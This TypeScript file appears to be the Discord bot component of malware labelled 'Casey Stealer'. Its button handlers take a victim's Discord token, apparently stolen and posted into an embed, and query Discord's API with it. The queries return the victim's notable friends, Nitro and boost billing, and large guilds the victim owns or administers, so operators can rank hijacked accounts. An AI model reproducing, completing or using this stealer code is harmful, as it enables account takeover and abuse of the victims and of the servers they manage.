import getHqFriends from '../functions/discord/returnBadges';

import { EmbedBuilder } from 'discord.js';
import { client } from '../app';
import { emojis } from './emojis';
import getBoost from '../functions/discord/getBoost';
import { badges_emoji } from './badges_emoji';

client.on('interactionCreate', async(interaction) => {
    if(!interaction.isButton()) return;
    console.log(interaction.customId)
    if(interaction.customId.startsWith('HQF')) {
        const request = await fetch('https://discord.com/api/v10/users/@me/relationships', {
            method: 'GET',
            headers: {
                Authorization: interaction?.message.embeds[0].fields[0].value.replaceAll('`', '').trim(),
                'Content-Type': 'application/json'
            }
        });

        const data = await request.json() as string[];
        if(request.status !== 200) {
            interaction.reply({
                content: `${emojis.empty} This user token is **invalid**. Can't process the request.`,
                ephemeral: true
            });
        } else {
            if(!data.length) return;
            const hqFriends = [];
    
            for(const friend of data) {
                const user = getHqFriends(friend);
                if(user) hqFriends.push(user);
            };
    
            if(!hqFriends.length) {
                interaction.reply({
                    content: `${emojis.empty} This user **HQ Friends** list is empty.`,
                    ephemeral: true
                });
            } else {
                const embed = new EmbedBuilder().setColor('#5865f2').setTimestamp()
                .setAuthor({ name: `Casey | Friends [${data.length}]`, iconURL: interaction.message.embeds[0].author?.iconURL})
                .addFields(
                    {
                        name: `${emojis.list} HQ Friends (${hqFriends.length}):`,
                        value: hqFriends?.join('\n').slice(0, 1024)
                    }
                )
                .setFooter({ text: `Casey Stealer`, iconURL: client.user?.avatarURL()! });
        
                interaction.reply({
                    ephemeral: true,
                    embeds: [
                        embed
                    ]
                });
            };
        }
    };

    if(interaction.customId.startsWith('BIF')) {
        const token = interaction.message.embeds[0].fields[0].value.replaceAll('`', '').trim();
        const request = await fetch('https://discord.com/api/v10/users/@me/billing/subscriptions', {
            method: 'GET',
            headers: {
                Authorization: token,
                'Content-Type': 'application/json'
            }
        });
        
        const data = await request.json() as string[];
        if(request.status !== 200) {
            interaction.reply({
                content: `${emojis.empty} This user token is **invalid**. Can't process the request.`,
                ephemeral: true
            });
        } else {
            if(!data.length) return;
            const boost_level = interaction.customId.split('BIF')[1].split('Casey')[0];
            const boost_date = interaction.customId.split('BIF')[1].split('Casey')[1];
    
            const boost_info = getBoost(boost_level, new Date(boost_date))
    
            const embed = new EmbedBuilder().setColor('#5865f2').setTimestamp()
            .setAuthor({ name: `Casey | Boost Informations`, iconURL: interaction.message.embeds[0].author?.iconURL })
            .setThumbnail(interaction.message.embeds[0].author?.iconURL!)
            .setFooter({ text: `Casey Stealer`, iconURL: client.user?.avatarURL()! });
    
            if(data.find((x: any) => x?.type === 1)) embed.addFields(
                {
                    name: `${badges_emoji.Nitro} Nitro Subscription:`,
                    // @ts-ignore
                    value: `Ends <t:${~~(Math.round(new Date(data.find((x: any) => x.type === 1)?.current_period_end)?.getTime()) / 1000)}:R> **(<t:${~~(Math.round(new Date(data.find((x: any) => x.type === 1)?.current_period_end)?.getTime()) / 1000)}:D>)**`
                }
            );
    
            embed.addFields(
                {
                    name: `${emojis.rocket} Current Boost:`,
                    // @ts-ignore
                    value: `${badges_emoji[boost_info?.current_level as keyof typeof badges_emoji]} <t:${~~(Math.round(boost_info?.current_level_date?.getTime()) / 1000)}:R> **(<t:${~~(Math.round(boost_info?.current_level_date?.getTime()) / 1000)}:D>)**`,
                },
                {
                    name: `${emojis.uptime} Next Boost:`,
                    // @ts-ignore
                    value: `${badges_emoji[boost_info?.next_level as keyof typeof badges_emoji]} <t:${~~(Math.round(boost_info?.next_level_date?.getTime()) / 1000)}:R> **(<t:${~~(Math.round(boost_info?.next_level_date?.getTime()) / 1000)}:D>)**`,
                }
            );
    
            interaction.reply({
                ephemeral: true,
                embeds: [
                    embed
                ]
            });
        };
    };

    if(interaction.customId.startsWith('HQG')) {
        const request = await fetch('https://discord.com/api/v10/users/@me/guilds?with_counts=true', {
            method: 'GET',
            headers: {
                Authorization: interaction.message.embeds[0].fields[0].value.replaceAll('`', '').trim(),
                'Content-Type': 'application/json'
            }
        });

        const data = await request.json() as string[];
        if(request.status !== 200) {
            interaction.reply({
                content: `${emojis.empty} This user token is **invalid**. Can't process the request.`,
                ephemeral: true
            });
        } else {
            const hqGuilds = data?.filter(((g: any) => g?.owner && g?.approximate_member_count >= 150 || g?.permissions == 562949953421311 && g?.approximate_member_count >= 150));
    
            if(!hqGuilds.length) {
                interaction.reply({
                    content: `${emojis.empty} This user **HQ Guilds** list is empty.`,
                    ephemeral: true
                });
            } else {
    
                const embed = new EmbedBuilder().setColor('#5865f2').setTimestamp()
                .setAuthor({ name: `Casey | Guilds [${data.length}]`, iconURL: interaction.message.embeds[0].author?.iconURL })
                .addFields(
                    {
                        name: `${emojis.list} HQ Guilds (${hqGuilds.length}):`,
                        value: hqGuilds?.map((g: any) => `${g.name} \`[${Number(g?.approximate_member_count).toLocaleString('en-US')}]\``).join('\n').slice(0, 1024)
                    }
                )
                .setFooter({ text: `Casey Stealer`, iconURL: client.user?.avatarURL()! });
    
                interaction.reply({
                    ephemeral: true,
                    embeds: [
                        embed
                    ]
                });
            };
        };
    };
});